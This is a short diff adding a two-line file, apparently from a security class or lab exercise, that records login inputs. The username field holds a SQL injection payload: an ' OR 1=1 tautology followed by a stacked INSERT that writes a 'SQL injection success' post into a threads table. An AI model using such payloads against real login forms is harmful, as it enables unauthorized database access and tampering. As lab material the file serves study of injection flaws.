@@ -1,0 +1,2 @@
+Username = auser' OR 1=1; INSERT INTO threads (username, title, message, date) VALUES('hxs200010', 'sql101', 'SQL injection success', '1683510133'); #
+Password = password
